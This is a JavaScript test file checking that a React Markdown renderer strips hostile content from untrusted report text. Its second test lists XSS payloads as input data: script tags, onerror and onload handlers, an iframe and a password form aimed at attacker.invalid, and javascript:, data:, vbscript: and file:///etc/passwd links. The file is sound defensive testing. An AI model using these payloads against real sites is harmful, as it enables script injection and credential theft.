import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import test from "node:test";
import vm from "node:vm";
import * as React from "react";
import * as jsxRuntime from "react/jsx-runtime";
import { renderToStaticMarkup } from "react-dom/server";
import ReactMarkdown from "react-markdown";
import remarkGfm from "remark-gfm";
import ts from "typescript";

function loadComponent(path, imports) {
  const source = readFileSync(new URL(path, import.meta.url), "utf8");
  const code = ts.transpileModule(source, { compilerOptions: {
    module: ts.ModuleKind.CommonJS, target: ts.ScriptTarget.ES2022, jsx: ts.JsxEmit.ReactJSX,
  } }).outputText;
  const context = vm.createContext({ exports: {}, URL, require(name) {
    if (name === "react/jsx-runtime") return jsxRuntime;
    assert.ok(name in imports, `Unexpected import: ${name}`);
    return imports[name];
  } });
  vm.runInContext(code, context);
  return context.exports;
}

const { Markdown } = loadComponent("../src/components/markdown.tsx", {
  react: React, "react-markdown": { default: ReactMarkdown }, "remark-gfm": { default: remarkGfm },
});
const render = text => renderToStaticMarkup(React.createElement(Markdown, { text }));

test("renders report formatting with the real Markdown and GFM parsers", () => {
  const html = render("## Inventory\n\n**Verified**\n\n- First\n- Second\n\n| Name | Status |\n| --- | --- |\n| user | done |\n\n```html\n<img src=x onerror=alert(1)>\n```");
  assert.match(html, /Inventory<\/div>/);
  assert.match(html, /<strong[^>]*>Verified<\/strong>/);
  assert.match(html, /<ul[^>]*>.*<li>First<\/li>/s);
  assert.match(html, /<table\b/);
  assert.match(html, /&lt;img src=x onerror=alert\(1\)&gt;/);
});

test("untrusted Markdown cannot create images, active HTML, or unsafe links", () => {
  const html = render(`![tracking](https://attacker.invalid/pixel.png)

![reference][pixel]

[pixel]: data:image/svg+xml;base64,PHN2Zz4=

<script>alert(1)</script>
<img src="https://attacker.invalid/raw.png" onerror="alert(1)">
<iframe src="https://attacker.invalid/"></iframe>
<svg onload="alert(1)"></svg>
<form action="https://attacker.invalid/"><input name="password"></form>

[one](javascript:alert%281%29) [two](jav&#x61;script:alert%281%29)
[three](data:text/html;base64,PHNjcmlwdD4=) [four](vbscript:evil)
[five](//attacker.invalid/) [six](file:///etc/passwd)

[Safe](https://dev366312.service-now.com/) [Local](/function/assessments)
`);
  assert.doesNotMatch(html, /<(?:img|picture|script|style|iframe|svg|form|input|object|embed|video|audio|link|meta)\b/i);
  assert.doesNotMatch(html, /\b(?:src|srcset|onerror|onload)=/i);
  assert.doesNotMatch(html, /href="(?:javascript:|data:|vbscript:|file:|\/\/)/i);
  assert.match(html, /href="https:\/\/dev366312\.service-now\.com\/"/);
  assert.match(html, /href="\/function\/assessments"/);
  assert.match(html, /rel="noopener noreferrer"/);
});

test("the assessment detail renders its stored report through the safe renderer", () => {
  const task = { id: "17", name: "Assessment", status: "done" };
  const detail = { task, id: "assessment", origin: "https://dev366312.service-now.com", definition: "servicenow.inventory", version: 1,
    observations: {}, sources: [], retained: [], report: { summary: "**Verified admin**\n\n![pixel](https://attacker.invalid/x)" } };
  const { AssessmentDetail } = loadComponent("../src/components/assessment-detail.tsx", {
    react: { ...React, useEffect() {}, useState(value) { return [value === null ? detail : value, () => {}]; } },
    "next/link": { default: ({ children, ...props }) => React.createElement("a", props, children) },
    "@/components/markdown": { Markdown }, "@/lib/api": { http() { assert.fail("Unexpected request"); } },
  });
  const html = renderToStaticMarkup(React.createElement(AssessmentDetail, { task }));
  assert.match(html, /<strong[^>]*>Verified admin<\/strong>/);
  assert.doesNotMatch(html, /<img\b/);
});
